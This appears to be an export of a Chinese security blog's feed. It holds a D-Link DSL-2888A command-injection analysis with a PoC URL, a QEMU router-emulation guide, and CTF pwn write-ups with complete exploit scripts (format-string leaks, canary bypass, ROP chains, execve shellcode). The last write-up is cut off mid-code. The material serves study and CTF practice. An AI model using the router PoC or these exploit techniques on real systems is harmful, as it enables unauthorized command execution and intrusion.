os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            filepath = os.path.join(root, file)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                line_number = <span class="number">1</span></span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">if</span> target_string.lower() <span class="keyword">in</span> line.lower():</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;Found in file: <span class="subst">&#123;filepath&#125;</span>, line: <span class="subst">&#123;line_number&#125;</span>, content: <span class="subst">&#123;line&#125;</span>&quot;</span>)</span><br><span class="line">                    line_number += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定要搜索的目录和目标字符串</span></span><br><span class="line">search_directory = <span class="string">&#x27;/home/chen/iot/_DSL-2888A_AU_2.12_V1.1.47Z1-Image-all.bin.extracted/jffs2-root&#x27;</span></span><br><span class="line">target_string = <span class="string">&#x27;QUERYSTRING&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数进行批量搜索</span></span><br><span class="line">search_files(search_directory, target_string)</span><br></pre></td></tr></table></figure><p>这里搜索QUERY_STRING没有找到有用的文件 所以去掉了_</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092144787.png" title="image-20230809214437721" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092144787.png" alt="image-20230809214437721"></a></p><p>于是我们可以定位到ajax.js文件</p><p>通过观察POC我们可以知道 是通过GET请求 很快可以定位到对应的代码</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">get <span class="punctuation">:</span> function(_dataType)</span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        var _url = this.url;</span><br><span class="line">        if(_url.indexOf(&#x27;?&#x27;) == <span class="number">-1</span>)</span><br><span class="line">            _url += &#x27;?timestamp=&#x27; + new Date().getTime();</span><br><span class="line">        else</span><br><span class="line">            _url += <span class="string">&quot;&amp;timestamp=&quot;</span> + new Date().getTime();</span><br><span class="line">        if(this.queryString.length &gt; <span class="number">0</span>)</span><br><span class="line">            _url += <span class="string">&quot;&amp;&quot;</span> + this.queryString;</span><br><span class="line"></span><br><span class="line">        this.xmlHttp.open(<span class="string">&quot;GET&quot;</span><span class="punctuation">,</span> _url<span class="punctuation">,</span> <span class="literal"><span class="keyword">true</span></span>);</span><br><span class="line">        <span class="comment">/* will make IE11 fail.</span></span><br><span class="line"><span class="comment">        if(!document.all)&#123;</span></span><br><span class="line"><span class="comment">            if(_dataType == &quot;xml&quot;)</span></span><br><span class="line"><span class="comment">                this.xmlHttp.overrideMimeType(&quot;text/xml;charset=utf8&quot;);</span></span><br><span class="line"><span class="comment">            else</span></span><br><span class="line"><span class="comment">                this.xmlHttp.overrideMimeType(&quot;text/html;charset=gb2312&quot;);//设定以gb2312编码识别数据  </span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        this.xmlHttp.send(<span class="literal"><span class="keyword">null</span></span>);</span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>不难看出其会在url后加上一个参数timestamp 用来记录当前的时间戳 随后拼接完url后发送</p><p>我个人认为这一步分析其实没有什么必要 因为在审计完execute_cmd.cgi后我们就可以得到POC如何编写了</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>加上刚才分析的 cmd参数是由第三个字段来的 也就是第二个参数 那么可以直接得到POC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx/cgi-bin/execute_cmd.cgi?aaaa=6&amp;bbbb=ls</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092154559.png" title="image-20230809215418504" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092154559.png" alt="image-20230809215418504"></a></p><h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><p>在dhttpd文件的分析中 可以看到要成功执行cgi文件还需要先进行登录验证</p><p>所以我们需要搭配上CVE-2020-24579才能成功复现该漏洞</p><p>这里就不进行讲解</p><p><a href="https://vuls.info/PeiQi/wiki/iot/D-Link/D-Link%20DSL-28881A%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20CVE-2020-24579/">https://vuls.info/PeiQi/wiki/iot/D-Link/D-Link%20DSL-28881A%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20CVE-2020-24579/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>qemu搭建路由器虚拟环境</title>
      <link href="/2023/08/09/qemu%E6%90%AD%E5%BB%BA%E8%B7%AF%E7%94%B1%E5%99%A8%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"/>
      <url>/2023/08/09/qemu%E6%90%AD%E5%BB%BA%E8%B7%AF%E7%94%B1%E5%99%A8%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在经历了一年的glibc学习 终于也是开始接触到了真正的二进制 怀着激动的心情 开始Iot的旅途！<br>本文用来收录不属于cve复现中的虚拟环境搭建过程</p><h1 id="华为532e"><a href="#华为532e" class="headerlink" title="华为532e"></a>华为532e</h1><p>本次使用的固件是华为532e系列路由器<br>固件下载地址： <a href="https://github.com/CcccccccJun/cloud">https://github.com/CcccccccJun/cloud</a></p><p>首先使用binwalk来提取固件 这里要注意一下 如果binwalk没有提取到root文件夹 那么问题出在没有安装相应的文件系统<br>该固件需要安装的是sasquatch 配置好相关环境后可以成功提取到文件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090859342.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090859342.png" alt="image.png"></a><br>随后我们将root目录打包成压缩文件 供等下上传到模拟系统中<br><code>tar -czvf 1.tar squashfs-root/</code><br>qemu模拟有多种形式 本次我们使用的是系统模拟 同时通过file观察任意的可执行文件 可以注意到该路由器使用的是MIPS架构<br>为此 我们需要准备MIPS的内核文件以及一个MIPS架构的虚拟机映像文件<br>可以在该网站上下载  <a href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a><br>随后我们需要创建一个TUN&#x2F;TAP虚拟网络接口 其可以在操作系统和用户空间之间进行网络数据包的传输 便于我们在虚拟机中连接到启动后的路由器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tunctl -t top0 -u root</span><br><span class="line">ifconfig top0 192.168.10.1</span><br></pre></td></tr></table></figure><p>我们给予的top0接口的ipv4地址的子网号可以为任意 同时要使用默认网关<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090936146.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090936146.png" alt="image.png"></a><br>随后我们利用qemu进行系统模拟<br><code>qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</code><br>为qemu模拟出来的虚拟机增加了一个TAP设备的虚拟网络接口top0用于通信<br>默认的登录账号和密码都是root<br>我们将eth0接口配置和刚才top0接口相同的c段<br><code>ifconfig eth0 192.169.10.2</code><br>随后就可以在ubuntu中访问到debian虚拟机<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090958896.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090958896.png" alt="image.png"></a><br>随后我们利用scp把刚才打包好的压缩文件上传到debian虚拟机中<br><code>scp 1.tar root@192.168.10.2:/root/</code><br>但是这里报错了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091008147.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091008147.png" alt="image.png"></a><br>大概意思是debian虚拟机中的openssh禁用了ssh-dss算法<br>我们需要手动加上参数来允许</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -oHostKeyAlgorithms=+ssh-dss 1.tar root@192.168.10.2:/root/</span><br></pre></td></tr></table></figure><p>随后回到debian虚拟机 利用<code>tar –zxvf 1.tar</code> 命令进行解压<br>接着我们需要将&#x2F;dev目录与squashfs-root目录进行绑定 使得可以访问到所需的设备文件<br>同理 将&#x2F;proc目录挂载到squashfs-root对应的目录下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">mount -t proc /proc ./squashfs-root/proc/</span><br></pre></td></tr></table></figure><p>随后以squashfs-root目录为根目录 执行shell<br><code>chroot ./squashfs-root/ sh</code><br>由于在路由器启动后 eth0接口的ip地址会被更改 所以我们需要在启动路由器的过程中 重新配置eth0接口 这也就意味着我们需要连接两个会话<br>已有的会话是通过qemu模拟后直接生成的虚拟机 不会随着ip的更改而断开 而通过ssh连接的会话会因为ip受到影响<br>于是 我们需要在ssh的会话中启动路由器 随后这个ssh进程就会因为ip改变而卡住 然后我们再通过原本的会话重新配置eth0 就可以成功启动路由器的同时 保证我们的eth0还是原本的ip地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./bin/upnp</span><br><span class="line">./bin/mic</span><br></pre></td></tr></table></figure><p>启动路由器的环境</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091028108.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091028108.png" alt="image.png"></a><br>成功启动后 我们就可以在宿主机中访问到路由器了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091029879.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091029879.png" alt="image.png"></a><br>这里使用360浏览器是因为其他浏览器不支持TLS1.0的协议 导致无法成功访问</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NssCTF round14</title>
      <link href="/2023/07/30/NssCTF-round14/"/>
      <url>/2023/07/30/NssCTF-round14/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="love"><a href="#love" class="headerlink" title="love"></a>love</h2><p>这题可以非预期 但是由于时间比较充裕 就按照出题人的意思来做一做</p><p>比较简单的一题 难点在于最后的破坏了tls结构体的时候 不能选择system函数 要用syscall 但是稍微修复一下tls结构体 还是可以调用system函数的</p><p>考点在于pthread_create会使得新线程栈的布局迁移到tls结构体附近的一块地址 导致我们可以通过栈溢出覆盖到tls的canary 从而来绕过canary</p><p>修复tls结构体只需要把fs:0x10处的值覆盖成addr+0x308后是一个可读的地址即可</p><p>自己调一调就可以懂了</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwn_pb2</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.anna.nssctf.cn&quot;</span>,<span class="number">28092</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;I want to hear your praise of Toka&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;%520c%9$n%17$p&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x40131B&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x401290&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;\xc0&quot;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fs_base = libc_addr - <span class="number">0x3900</span></span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">rdi_addr = <span class="built_in">next</span>(elf.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>)))</span><br><span class="line">ret_addr = <span class="built_in">next</span>(elf.search(asm(<span class="string">&quot;ret&quot;</span>)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;I know you like him, but you must pass my level&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+p64(<span class="number">0x100</span>)+cyclic(<span class="number">0x8</span>)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)+cyclic(<span class="number">0x840</span>-<span class="number">0x30</span>-<span class="number">0x28</span>)+cyclic(<span class="number">0x10</span>)+p64(elf.bss(<span class="number">0x200</span>))+cyclic(<span class="number">0x10</span>)+<span class="string">b&#x27;\x00\x01\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,f&#x27;b *&#123;libc_addr+0x10ca1e&#125;&#x27;)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="rbp"><a href="#rbp" class="headerlink" title="rbp"></a>rbp</h2><p>劫持rbp可以任意写 然后就是打orw 没什么好说的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwn_pb2</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node3.anna.nssctf.cn&quot;,28092)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;try it&quot;</span>)</span><br><span class="line">ptr_read = <span class="number">0x401292</span></span><br><span class="line">bss_addr = elf.bss(<span class="number">0x800</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x210</span>)+p64(bss_addr+<span class="number">0x210</span>)+p64(ptr_read)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="built_in">next</span>(elf.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>)))</span><br><span class="line">rbp_addr = <span class="built_in">next</span>(elf.search(asm(<span class="string">&quot;pop rbp;ret&quot;</span>)))</span><br><span class="line">leave_addr = <span class="built_in">next</span>(elf.search(asm(<span class="string">&quot;leave;ret&quot;</span>)))</span><br><span class="line">puts_plt = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(rbp_addr)+p64(bss_addr+<span class="number">0x510</span>)+p64(ptr_read)+<span class="string">b&#x27;./flag\x00\x00&#x27;</span>+cyclic(<span class="number">0x210</span>-<span class="number">0x38</span>)+p64(bss_addr-<span class="number">0x8</span>)+p64(leave_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4012C0&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">rsi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>)))</span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x0000000000142c92</span></span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">flag_addr = bss_addr+<span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">payload = p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">3</span>)+p64(rsi_addr)+p64(bss_addr+<span class="number">0x600</span>)+p64(rdx_addr)+p64(<span class="number">0x100</span>)+p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">1</span>)+p64(rsi_addr)+p64(bss_addr+<span class="number">0x600</span>)+p64(write_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x210</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss_addr+<span class="number">0x300</span>-<span class="number">0x8</span>)+p64(leave_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4012C0&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307312214981.png" title="image-20230731221415889" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307312214981.png" alt="image-20230731221415889"></a></p><p>保护全关了 可用的攻击手法变得多元化起来了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+7h] [rbp-9h] BYREF</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( flag &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%p&quot;</span>, &amp;v5);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot; %hhx&quot;</span>, &amp;v4);</span><br><span class="line">    xorByteWithAddress(v5, v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序的主体逻辑很简单 </p><p>就是可以向一个任意地址 进行一次单字节的异或的操作</p><p>但是由于while循环的条件是flag小于等于0</p><p>执行完xorByteWithAddress函数后 flag的值自增 就退出while循环</p><p>所以我们首要的思路就是想办法把flag的值修改成负数</p><p>随后往bss段上写入shellcode 利用main函数结束会调用隐式exit函数 中间利用call函数调用了fini_array</p><p>通过覆盖fini_array就可以调用到shellcode</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwn_pb2</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node3.anna.nssctf.cn&quot;,28092)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">fini_addr = <span class="number">0x600970</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">addr,xor_message</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;addr: &quot;</span>)</span><br><span class="line">    got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">    io.sendline(addr)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;value: &quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(io,&#x27;b *0x400738&#x27;)</span></span><br><span class="line">    io.sendline(xor_message)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr =elf.bss(<span class="number">0x300</span>)</span><br><span class="line">shellcode = [<span class="string">&#x27;48&#x27;</span>,<span class="string">&#x27;31&#x27;</span>,<span class="string">&#x27;f6&#x27;</span>,<span class="string">&#x27;56&#x27;</span>,<span class="string">&#x27;48&#x27;</span>,<span class="string">&#x27;bf&#x27;</span>,<span class="string">&#x27;2f&#x27;</span>,<span class="string">&#x27;62&#x27;</span>,<span class="string">&#x27;69&#x27;</span>,<span class="string">&#x27;6e&#x27;</span>,<span class="string">&#x27;2f&#x27;</span>,<span class="string">&#x27;2f&#x27;</span>,<span class="string">&#x27;73&#x27;</span>,<span class="string">&#x27;68&#x27;</span>,<span class="string">&#x27;57&#x27;</span>,<span class="string">&#x27;54&#x27;</span>,<span class="string">&#x27;5f&#x27;</span>,<span class="string">&#x27;6a&#x27;</span>,<span class="string">&#x27;3b&#x27;</span>,<span class="string">&#x27;58&#x27;</span>,<span class="string">&#x27;99&#x27;</span>,<span class="string">&#x27;0f&#x27;</span>,<span class="string">&#x27;05&#x27;</span>]</span><br><span class="line">xor(<span class="string">&quot;600BCf&quot;</span>,<span class="string">&quot;ff&quot;</span>)</span><br><span class="line">addr = <span class="string">&quot;600ea0&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> shellcode:</span><br><span class="line">    xor(addr,i)</span><br><span class="line">    num = <span class="built_in">int</span>(addr, <span class="number">16</span>)</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    addr = <span class="built_in">format</span>(num, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(addr)</span><br><span class="line">xor(<span class="string">&quot;600970&quot;</span>,<span class="string">&quot;b0&quot;</span>)</span><br><span class="line">xor(<span class="string">&quot;600971&quot;</span>,<span class="string">&quot;8&quot;</span>)</span><br><span class="line">xor(<span class="string">&quot;600972&quot;</span>,<span class="string">&quot;20&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *_dl_fini+524&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">xor(<span class="string">&quot;600Bcf&quot;</span>,<span class="string">&quot;ff&quot;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>星ctf2023</title>
      <link href="/2023/07/30/%E6%98%9Fctf2023/"/>
      <url>/2023/07/30/%E6%98%9Fctf2023/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>比赛名应该是*ctf 但是由于我hexo框架不能命名为 * 所以只能叫星了</p><h2 id="fcalc"><a href="#fcalc" class="headerlink" title="fcalc"></a>fcalc</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307300137270.png" title="image-20230730013704199" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307300137270.png" alt="image-20230730013704199"></a></p><p>没有开启NX保护 第一反应就是要打shellcode</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">double</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">double</span> *v9; <span class="comment">// [rsp+20h] [rbp-38h]</span></span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+28h] [rbp-30h]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line">  <span class="type">double</span> v12; <span class="comment">// [rsp+38h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+40h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">400LL</span>);</span><br><span class="line">  s = (<span class="number">16</span> * ((&amp;v6 + <span class="number">3</span>) &gt;&gt; <span class="number">4</span>));</span><br><span class="line">  v4 = alloca(<span class="number">64LL</span>);</span><br><span class="line">  buf = s;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x180</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  qword_40E0 = s;</span><br><span class="line">  dword_4010 = <span class="number">0</span>;</span><br><span class="line">  sub_1384();</span><br><span class="line">  say();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = read(<span class="number">0</span>, buf, <span class="number">0x180</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( v6 